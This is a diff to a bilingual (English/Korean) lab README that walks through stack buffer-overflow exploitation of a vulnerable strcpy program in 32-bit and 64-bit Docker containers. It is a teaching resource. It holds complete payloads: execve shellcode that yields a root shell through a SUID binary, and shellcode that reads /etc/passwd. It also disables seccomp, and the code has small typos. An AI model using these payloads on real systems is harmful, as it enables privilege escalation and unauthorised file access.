@@ -3,19 +3,107 @@
 
 ## Table of Contents
 
-- [Docker Environment](#)
-- [Kernel Space / User Space](#kernel-space--user-space)
-- [gdb execute](#gdb-execute)
-    - [Before Executing `strcpy`](#before-executing-strcpy)
-    - [After Executing `strcpy`](#after-executing-strcpy)
-- [Adequate Length of "A"](#adequate-length-of-a)
-- [Exploit Payload](#exploit-payload)
-- [Trouble Shooting](#trouble-shooting)
+- [Background](#background)
+- [English Ver.](#english-version)
+    - [x86 32 bit Ubuntu Buffer Overflow](#x86-32-bit-ubuntu-buffer-overflow)
+        - [Docker Environment](#docker-environment)
+        - [Kernel Space / User Space](#kernel-space--user-space)
+        - [gdb execute](#gdb-execute)
+            - [Before Executing `strcpy`](#before-executing-strcpy)
+            - [After Executing `strcpy`](#after-executing-strcpy)
+        - [Adequate Length of "A"](#adequate-length-of-a)
+        - [Exploit Payload](#exploit-payload)
+        - [Trouble Shooting](#trouble-shooting)
+
+    - [x86 64 bit Ubuntu Buffer Overflow](#x86-64-bit-ubuntu-buffer-overflow)
+        - [Docker Environment Setup](#docker-environment-setup)
+        - [GDB Execution](#gdb-execution-1)
+        - [Overflowing the Return Address](#overflowing-the-return-address)
+        - [Finding the Jump Address](#finding-the-jump-address)
+        - [Exploit Payload](#exploit-payload-1)
+        - [Troubleshooting — Address Shift](#troubleshooting--address-shift)
+        - [Troubleshooting — File Not Found](#troubleshooting--file-not-found)
+        - [Recompiling the Shellcode](#recompiling-the-shellcode)
+        - [Success Results](#success-results)
 
 > For Korean
 - [Korean Ver.](#korean-ver)
 
 ---
+
+# Background
+
+## Buffer Overflow
+
+A buffer overflow is a vulnerability that occurs when a program writes more data into a fixed-size memory buffer than it can hold. The excess data overflows into adjacent memory regions, potentially corrupting data, crashing the program, or — most dangerously — allowing an attacker to hijack the program's control flow and execute arbitrary code.This vulnerability is most commonly found in low-level languages like C and C++, where the programmer is responsible for managing memory boundaries. Functions like strcpy, gets, and sprintf do not perform bounds checking, making them prime targets for exploitation.
+
+## Stack Memory Layout
+
+To understand how buffer overflows work, we must first understand the structure of the call stack. When a function is called, a new stack frame is pushed onto the stack containing:
+
+```
+High Address
+┌─────────────────────────┐
+│  Function Arguments     │
+├─────────────────────────┤
+│  Return Address (RIP)   │  ← where execution resumes after the function returns
+├─────────────────────────┤
+│  Saved Base Pointer     │  ← previous frame's RBP
+├─────────────────────────┤
+│  Local Variables        │
+│  (including buffer[])   │  ← stack grows downward
+└─────────────────────────┘
+Low Address
+```
+
+Key observations:
+
+- The stack grows downward (from high addresses to low addresses)
+- Local variables, including buffers, are allocated below the saved base pointer and return address
+- When data is written into a local buffer, it is written upward (from low to high addresses)
+
+This creates a dangerous asymmetry: if a buffer is filled beyond its declared size, the excess bytes will overwrite the saved base pointer and, eventually, the return address itself
+
+## How the Overflow Hijacks Control Flow
+
+Consider a vulnerable function:
+
+```c
+cvoid vulnerable(char *input) {
+    char buffer[256];
+    strcpy(buffer, input);   // No bounds checking!
+}
+```
+
+When the function is called, the stack looks like this(It's little different by user's OS bit system):
+```
+[ buffer (256 bytes) ][ saved RBP (8B) ][ return address (8B) ]
+       ↑
+       strcpy writes here, growing upward →
+```
+If input contains more than 256 bytes, strcpy continues writing past the buffer's end, eventually overwriting the return address. When the function reaches its ret instruction, the CPU pops what it believes to be the return address from the stack and jumps to that location.
+If an attacker controls the bytes that overwrite the return address, the attacker controls where the program jumps next.
+
+## The Three Stages of Exploitation
+
+A successful buffer overflow exploit typically consists of three stages:
+
+1. Reach the Return Address: The attacker must determine exactly how many bytes are needed to fill the buffer and reach the saved return address. This is the offset — for example, 280 bytes in our case (buffer[256] + alignment + saved RBP).
+2. Place Executable Code: The attacker injects shellcode — a sequence of machine instructions designed to perform a malicious action, such as spawning a shell or reading sensitive files. This shellcode is typically placed at the beginning of the input string, well within the buffer itself.
+3. Redirect Execution to the Shellcode: The attacker overwrites the return address with a value that points back into the buffer, where the shellcode resides. When the function returns, the CPU jumps to the shellcode and executes it.
+
+A common technique to make this more reliable is the NOP sled — a long run of \x90 (NOP, "no operation") instructions placed before the shellcode. Since stack addresses can shift slightly between executions, the NOP sled provides a "landing zone": as long as the return address points anywhere within the sled, the CPU will simply slide through the NOPs until it reaches the actual shellcode.
+
+```
+[ NOP NOP NOP ... NOP NOP ][ shellcode ][ ... ][ overwritten return address ]
+       ↑                       ↑                          │
+       │                       │                          │
+       └───────── jump here ◄──┴──────────────────────────┘
+```
+
+# English Version
+
+## x86 32 bit Ubuntu Buffer Overflow
 
 ### Docker Environment
 
@@ -27,12 +115,9 @@ To spin up the container environment, run the following commands:
 sudo docker compose up -d
 
 sudo docker exec -it ubuntu_x86_32 /bin/bash
-
 ```
 
 Now, you can safely proceed with the buffer overflow practice inside the interactive container shell.
-
----
 
 ### Kernel Space / User Space
 
@@ -56,7 +141,6 @@ Now, you can safely proceed with the buffer overflow practice inside the interac
 
 ```
 
----
 
 ### GDB Execution
 
@@ -85,8 +169,6 @@ Once `strcpy` finishes, its individual stack frame clears, and control shifts ba
 
 To find the precise offset needed to control the return address without unnecessarily destroying adjacent memory structures, we can substitute "A"s with distinct character sequences (like "B", "C", etc.) and observe exactly where the values shift.
 
----
-
 ### Determining the Adequate Length of "A"
 
 At the assembly level, space for local variables is reserved at the very beginning of the function prologue. For a `buffer[256]` declaration, the compiler allocates corresponding stack space. We can verify the precise allocation size by analyzing the assembly instructions.
@@ -95,7 +177,6 @@ Right before calling `strcpy`, the following instruction appears:
 
 ```c
 lea    eax,[ebp-0x118]
-
 ```
 
 This instruction loads the address of the local buffer into `eax` to pass it as the destination argument for `strcpy`. It pushes `eax` right before making the function call:
@@ -131,8 +212,6 @@ Low <- [NOP sled + shellcode (280B)] [saved EBP (4B)] [return address (4B)] -> H
 
 ```
 
----
-
 ### Exploit Payload
 
 To verify control flow redirection, we first test a baseline structural payload:
@@ -149,8 +228,6 @@ The image above shows the state before the function call.
 After execution, an anomaly appears: `esp` points to `0x4141413d`. Because we appended `DDDD`, we expected `esp` to jump elsewhere, or at least match `0x41414141`.
 
 To understand why `esp` lands on `0x4141413d`, we must examine the function epilogue assembly instructions.
-
----
 
 ### Troubleshooting
 
@@ -198,14 +275,13 @@ The register state indicates that the crash targets the "h" character sequence. 
 
 ```bash
 run $(python3 -c 'print("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZaaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffggggggggABCDEFGHiiiiiiiiABCD")')
-
 ```
 
 The exact match is located at offset 268 (the character sequence right after 'g'). This means offset 268 directly controls the `ecx` register. During the epilogue execution, the instruction `*(ecx-4)` will evaluate to `*(buffer+264)` and serve as our execution redirect target.
 
 The final payload design maps out as follows:
 
-```
+```text
 Offset 264 ~ 267 : Target address to jump to (★ becomes the destination for ret)
 Offset 268 ~ 271 : Target value to be loaded into the ecx register
 Offset 272 ~ 279 : NOP Padding (8 bytes)
@@ -219,7 +295,6 @@ We will use a standard 32-bit Linux local shellcode block that executes `execve(
 
 ```bash
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
-
 ```
 
 Because x86 32-bit systems utilize **Little-Endian** byte ordering, multi-byte memory addresses must be written in reverse-byte order. We use Python's built-in `struct` module to guarantee proper byte packaging:
@@ -235,7 +310,6 @@ p = b"\x90" * 264 + \
     b"\x90" * 8 + sc; \
 sys.stdout.buffer.write(p)' \
 )"
-
 ```
 
 | Offset | Content | Role |
@@ -269,15 +343,255 @@ The modified payload successfully executes, spawning a root shell.
 
 ```bash
 whoami
-
 ```
 
 Because the binary was compiled with the SUID bit enabled, executing `execve("/bin/sh")` retains the elevated privileges of the binary owner rather than dropping back down to our standard unprivileged user account (`seonghun...`), achieving full privilege escalation.
 
+---
+
+## x86 64-bit Ubuntu Buffer Overflow
+
+### Docker Environment Setup
+
+```bash
+sudo docker compose up -d
+
+sudo docker exec -it ubuntu_x86_64 /bin/bash
+```
+
+Using the commands above, enter the 64-bit OS container.
+
+### GDB Execution
+
+Let's debug the program to prepare for the buffer overflow attack.
+
+![debugging](img/after_execute_strcpy_in64.png)
+
+The screenshot above shows the state after `strcpy` has been executed.
+
+![after leave](img/after_leave_inst.png)
+
+After the `leave` instruction is executed, `rsp` points to `0xffffffffe518`, and the value at that address contains the `0x414141414141` that we overflowed (although we don't yet know the exact position).
+
+While we could find the position by varying the input string as we did in the 32-bit case, this time let's calculate it directly.
+
+After executing `strcpy`, `rsp` was pointing to `e400`. After `leave`, `rsp` became `e518`. This means the difference between the `strcpy` stack frame's frame pointer and `main`'s stack frame's frame pointer is `0x118`. Between them lies the space for `char buffer[256]`. Note that `0x118` equals 280 bytes — the same as in the 32-bit case.
+
+### Overflowing the Return Address
+
+Therefore, by inputting 280 characters, we can fill up to the saved RBP, with the return address located right above it. Let's run the following command to overflow it:
+
+```bash
+run $(python3 -c 'print("A" * 280 + "B" * 6)')
+```
+
+We used 6 bytes for "B" because 64-bit addresses are longer than 32-bit ones. We intentionally didn't fill it completely so that the return address stays within the accessible user space range. Let's run this as an experiment.
+
+![after leave](img/after_leave_inst_2.png)
+
+This is the state after the `leave` instruction. We've completely exited `strcpy` and returned to `main`, and we can see that our `"BBBBBB"` is located at address `e538`.
+
+However, `rsp` is pointing to `e528`, which means it's not referencing `0x0000424242424242`. It seems that the stack frame's starting position shifted slightly because our `argv` argument became longer. Let's compensate by removing 16 "A"s.
+
+![after leave instruction](img/after_leave_inst_3.png)
+
+Now it's aligned correctly. Let's use `stepi` to execute the `ret` instruction.
+
+![after ret instruction](img/after_ret_inst.png)
+
+We can see that the instruction pointer register (`rip`) has been redirected to the address we wanted. Now we can place our exploit payload at this jump destination.
+
+To determine an appropriate jump address, let's first examine where our many "A" characters are distributed in memory.
+
+### Finding the Jump Address
+
+```bash
+run $(python3 -c 'print("A" * 300)')
+```
+
+After fully executing `strcpy`, let's inspect the contents starting from `$rsp`:
+
+```bash
+x/200xg $rsp
+```
+
+![jump address](img/jump_addr.png)
+
+While targeting the middle of the buffer would give us a comfortable margin for our exploit, I'll target the very beginning at `e410`.
+
+Let's run the following code to set up the jump address:
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 264 + b"\x7f\xff\xff\xff\xe4\x10"[::-1])')"
+```
+
+![alt text](img/after_return.png)
+
+The address was loaded into `rsi` correctly. Now let's insert the exploit payload.
+
+### Exploit Payload
+
+We'll use the machine code provided in the reference document:
+
+```
+\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
+```
+
+Since the shellcode is 82 bytes total, we reduce the "A" padding by 82 bytes and insert the shellcode in its place:
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + b"A" * 182 + b"\x7f\xff\xff\xff\xe4\x10"[::-1])')"
+```
+
+Let's execute it.
+
+### Troubleshooting — Address Shift
+
+![fail after return](img/fail_after_ret.png)
+
+After `ret`, the relevant memory now starts at `e438`. This appears to be because our `argv` grew even longer, shifting the stack starting position. Let's adjust accordingly:
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + b"A" * 182 + b"\x7f\xff\xff\xff\xe4\x38"[::-1])')"
+```
+
+![after revise](img/after_revise_return_address.png)
+
+We thought it would work now, but we hit another wall.
+
+### Troubleshooting — File Not Found
+
+As execution continued, we encountered the following:
+
+![file not found](img/file_not_found.png)
+
+We can see that `rax` is set to `-2`, which suggests an error indicating that `/etc/passwd` was not found. Let's check whether the file actually exists on the terminal.
+
+![alt text](img/passwd.png)
+
+The file is present, but it appears the program cannot read it.
+
+After some research, we learned that Docker has a feature called **seccomp** (short for *Secure Computing Mode*), a Linux kernel security feature that restricts which system calls a process can make to the kernel, helping to safely isolate containers.
+
+To bypass this, we modify the `docker-compose` configuration to disable seccomp when running the container:
+
+```yaml
+security_opt:
+  - seccomp=unconfined
+```
+
+After restarting the container, we noticed that the starting address had shifted yet again.
+
+![alt text](<img/스크린샷 2026-05-31 오후 3.48.54.png>)
+
+We need to readjust. The bytes `0f f6 31 48` appear to be located 12 bytes ahead of where we expected. Let's add a generous NOP sled so that the shellcode will still execute correctly:
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 32 + b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + b"A" * 150 + b"\x7f\xff\xff\xff\xe4\x38"[::-1])')"
+```
+
+![nop](img/enter_nop.png)
+
+Execution successfully landed in the NOP sled. However:
+
+![1](img/1.png) ![2](img/2.png) ![3](img/3.png)
+
+As shown above, the exploit still failed. We suspect that the provided machine code may have been corrupted in transcription, so let's recompile the assembly source on this machine using `nasm` and extract fresh machine code.
+
+### Recompiling the Shellcode
+
+Install the required tools:
+
+```bash
+apt update
+apt install -y nasm binutils
+```
+
+Create the assembly source file:
+
+```bash
+cat > readfile.asm << 'EOF'
+BITS 64
+; Author: Mr.Un1k0d3r - RingZer0 Team
+; Read /etc/passwd Linux x86_64 Shellcode
+global _start
+section .text
+_start:
+jmp _push_filename
+_readfile:
+    ; syscall: open file
+    pop rdi                       ; pop path string address
+    xor byte [rdi + 11], 0x41     ; NULL byte fix ('A' -> '\0')
+    xor rax, rax
+    add al, 2                     ; sys_open = 2
+    xor rsi, rsi                  ; O_RDONLY = 0
+    syscall
+
+    ; syscall: read file
+    sub sp, 0xfff
+    lea rsi, [rsp]
+    mov rdi, rax                  ; fd
+    xor rdx, rdx
+    mov dx, 0xfff                 ; size to read
+    xor rax, rax                  ; sys_read = 0
+    syscall
+
+    ; syscall: write to stdout
+    xor rdi, rdi
+    add dil, 1                    ; stdout fd = 1
+    mov rdx, rax                  ; bytes read
+    xor rax, rax
+    add al, 1                     ; sys_write = 1
+    syscall
+
+    ; syscall: exit
+    xor rax, rax
+    add al, 60                    ; sys_exit = 60
+    syscall
+
+_push_filename:
+    call _readfile
+    path: db "/etc/passwdA"
+EOF
+```
+
+Assemble it and extract the machine code:
+
+```bash
+nasm -f elf64 readfile.asm -o readfile.o
+
+for i in $(objdump -d readfile.o | grep "^ " | cut -f2); do 
+    printf '\\x%s' $i
+done
+echo
+```
+
+Verify the shellcode length:
+
+```bash
+objcopy -O binary -j .text readfile.o readfile.bin
+wc -c readfile.bin
+```
+
+The output confirms 82 bytes, matching the expected size. Now we insert this freshly compiled shellcode back into the exploit payload:
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 32 + b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + b"A" * 150 + b"\x7f\xff\xff\xff\xe4\x38"[::-1])')"
+```
+
+### Success Results
+
+Now let's run it and step through with `stepi`:
+
+![alt text](img/success_passwd.png)
+
+The exploit succeeded — the contents of `/etc/passwd` are displayed, confirming that arbitrary code execution was achieved through the buffer overflow vulnerability.
 
 ---
 
 # Korean Ver.
+
+## x86 32 bit Ubuntu Buffer Overflow
 
 ### Docker Environment
 
@@ -559,3 +873,231 @@ whoami
 ![whoami](img/success2.png)
 
 바이너리에 SUID 비트가 설정되어 있어, execve("/bin/sh") 호출 시 소유자 권한의 셸이 실행되며 권한 탈취가 발생하며 원래 설정했던 user(seonghun...) 가 안나오고 권한 탈취에 성공한 것을 볼 수 있다.
+
+---
+
+## x86 64 bit Ubuntu Buffer Overflow
+
+### Docker Environment Setting
+
+```bash
+sudo docker compose up -d
+
+sudo docker exec -it ubuntu_x86_64 /bin/bash
+```
+
+위 명령어를 통해 이제 64 bit 운영체제로 들어가주자.
+
+### gdb executing
+
+마찬가지로 buffer overflow 를 위한 디버깅을 해주자.
+
+![debugging](img/after_execute_strcpy_in64.png)
+
+`strcpy` 이후까지 실행한 결과다.
+
+![after leave](img/after_leave_inst.png)
+
+leave 명령문이 끝난 이후에 rsp 가 가르키고 있는 곳은 `0xffff ffff e518` 이고, 해당 주소의 값에는 우리가 overflow 했던 `0x414141414141` 이 저장되어 있다(어느 위치인지는 모른다). 물론 여기서 32 bit 때처럼 문자열을 바꿔가면서 위치를 찾아도 되지만 이번에는 계산을 해보자.
+
+strcpy 를 실행한 이후에는 rsp 가 가르키는 곳은 `e400` 의 위치였다. leave 이후에 rsp 는 `e518` 이 되었다. 이 말은 즉, 우리가 strcpy 의 스택프레임에 프레임 포인터와 main 의 스택프레임에 프레임 포인터 차이가 `0x118` 의 차이가 난다는 소리이다. 그렇다면 그 사이에는 `char buffer[256]` 의 공간이 있을 것이다. `0x118` 은 280 bit 이다(32 비트 때랑 똑같다).
+
+### Overflow Return Address
+
+따라서 280 개의 character 를 넣으면 saved rsp 까지 채울 수 있을 것이며, 바로 위에는 ret addr. 가 자리잡고 있을 것이다. 이를 overflow 하기 위해 다음 명령어를 쳐보자.
+
+```bash
+run $(python3 -c 'print("A" * 280 + "B" * 6)')
+```
+
+6개로 한 이유는 주소 체계가 32 비트 보다 더 길기 때문에 어느 정도 user space 에 접근할 수 있을 정도의 return address 를 주기 위해 꽉 채우진 않았다. 일단 실험삼아 실행시켜보자.
+
+![after leave](img/after_leave_inst_2.png)
+
+leave instruction 후이다. strcpy 명령을 완전히 빠져나와 main 으로 돌아간 시점이며, `e538` 에 우리가 썼던 "BBBBBB" 가 있음을 볼 수 있다.
+
+하지만 rsp 가 `e528` 을 가르키고 있어 0x0000424242424242 를 참조하지 않음을 볼 수 있다. 우리가 `argv` 에 인자를 넣을 때 조금 길어져서 stack frame 의 시작 위치가 재조정되며 조금 밀려난 듯하다. 이를 맞춰주기 위해 "A" 를 16개 빼주자.
+
+![after leave instruction](img/after_leave_inst_3.png)
+
+이제 맞춰졌다. 여기서 stepi 를 통해 ret 를 해보자.
+
+![after ret instruction](img/after_ret_inst.png)
+
+instruction pointer register 가 우리가 원하던 주소로 바뀐 것을 볼 수 있다. 이제 여기에 우리가 점프할 주소를 넣어 거기서부터 exploit payload 를 넣으면 된다.
+
+여기서는 점프할 주소를 보기 위해 우선 여러 개의 "A" 가 어느 주소에 분포하고 있는지 살펴보자.
+
+### Finding Jump Address
+
+```bash
+run $(python3 -c 'print("A" * 300)')
+```
+
+위 명령어를 실행하여 strcpy를 완전히 실행한 후에 $rsp 를 출력해보자.
+
+```bash
+x/200xg $rsp
+```
+
+![jump address](img/jump_addr.png)
+
+딱 중간쯤에 넣어두면 넉넉히 exploit 을 할 수 있을 듯하지만, 필자는 맨 처음인 `e410` 에 넣으려고 한다.
+
+다음 jump address exploit code 를 넣어서 실행해준다.
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 264 + b"\x7f\xff\xff\xff\xe4\x10"[::-1])')"
+```
+
+![alt text](img/after_return.png)
+
+rsi 에 잘 들어갔다. 이제 exploit payload 를 넣자.
+
+### Exploit Payload
+
+exploit payload 는 참고 문서에 주신 기계어로 수행하자.
+
+```
+\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x8\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
+```
+
+총 82 bytes 이므로 "A" 가 들어가는 자리에 82 bytes 만큼 빼주고 이를 넣어주자.
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + b"A" * 182 + b"\x7f\xff\xff\xff\xe4\x10"[::-1])')"
+```
+
+이제 실행시켜보자.
+
+### Trouble Shooting
+
+![fail after return](img/fail_after_ret.png)
+
+return 이후에 주소를 보니 `e438` 부터 시작됨을 알 수 있다. 이는 argv 가 길어져서 stack 시작지점이 조정된 듯하다. 다시 바꿔주자.
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + b"A" * 182 + b"\x7f\xff\xff\xff\xe4\x38"[::-1])')"
+```
+
+![after revise](img/after_revise_return_address.png)
+
+이제 제대로 실행될 줄 알았는데 또 다른 벽이 있었다.
+
+### Trouble Shooting - File Not Found
+
+계속 실행하다 보면 다음을 마주쳤다.
+
+![file not found](img/file_not_found.png)
+
+rax 가 -2 로 세팅되는 것을 볼 수 있는데, `/etc/passwd` 라는 파일이 없어서 생긴 오류인 듯하다. 그래서 터미널에서 /etc/passwd 가 있는지 살펴보았다.
+
+![alt text](img/passwd.png)
+
+위 그림에서는 있는 듯하다. 하지만 이를 읽어들일 수 없는 상태인거 같다.
+
+검색해보니 Docker 에는 seccomp 기능이 있는데, 'Secure Computing Mode' 의 약자로,  
+프로세스가 리눅스 커널에 요청할 수 있는 시스템 콜을 제한하여 컨테이너를 안전하게 격리하는 리눅스 커널 보안 기능이라고 한다.
+
+따라서 이를 실행할 때 끄고 들어가게 docker compose 를 수정한다.
+
+```bash
+security_opt:
+  - seccomp=unconfined
+```
+
+실행 후에 다시 보니 또 시작지점이 바뀐 듯하다.
+
+![alt text](<img/스크린샷 2026-05-31 오후 3.48.54.png>)
+
+다시 조정해주자.. 0f f6 31 48 은 12 byte 뒤의 주소로 잡혔다. `\90` 을 넉넉히 넣고 실행이 되게 해주자.
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 32 + b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + b"A" * 150 + b"\x7f\xff\xff\xff\xe4\x38"[::-1])')"
+```
+
+![nop](img/enter_nop.png)
+
+nop 영역으로 들어왔다. 하지만
+
+![1](img/1.png) ![2](img/2.png) ![3](img/3.png)
+
+위처럼 실패했다. 어셈블리어를 해당 컴퓨터에서 다시 nasm 으로 컴파일하여 기계어를 뽑아내자
+
+```bash
+apt update
+apt install -y nasm binutils
+```
+
+```bash
+cat > readfile.asm << 'EOF'
+BITS 64
+; Author Mr.Un1k0d3r - RingZer0 Team
+; Read /etc/passwd Linux x86_64 Shellcode
+global _start
+section .text
+_start:
+jmp _push_filename
+_readfile:
+    ; syscall open file
+    pop rdi             ; pop path value
+    xor byte [rdi + 11], 0x41    ; NULL byte fix ('A' -> \0)
+    xor rax, rax
+    add al, 2           ; sys_open = 2
+    xor rsi, rsi        ; O_RDONLY = 0
+    syscall
+
+    ; syscall read file
+    sub sp, 0xfff
+    lea rsi, [rsp]
+    mov rdi, rax        ; fd
+    xor rdx, rdx
+    mov dx, 0xfff       ; size to read
+    xor rax, rax        ; sys_read = 0
+    syscall
+
+    ; syscall write to stdout
+    xor rdi, rdi
+    add dil, 1          ; stdout fd = 1
+    mov rdx, rax        ; bytes read
+    xor rax, rax
+    add al, 1           ; sys_write = 1
+    syscall
+
+    ; syscall exit
+    xor rax, rax
+    add al, 60          ; sys_exit = 60
+    syscall
+
+_push_filename:
+    call _readfile
+    path: db "/etc/passwdA"
+EOF
+```
+
+```bash
+nasm -f elf64 readfile.asm -o readfile.o
+
+for i in $(objdump -d readfile.o | grep "^ " | cut -f2); do 
+    printf '\\x%s' $i
+done
+echo
+```
+
+```bash
+# 길이 확인
+objcopy -O binary -j .text readfile.o readfile.bin
+wc -c readfile.bin
+```
+
+82 bytes 를 다시 run 에 exploit payload 로 넣는다.
+
+```bash
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 32 + b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + b"A" * 150 + b"\x7f\xff\xff\xff\xe4\x38"[::-1])')"
+```
+
+이제 실행 후 stepi 로 천천히 실행시켜보자.
+
+![alt text](img/success_passwd.png)
+
+성공한 것을 볼 수 있다.
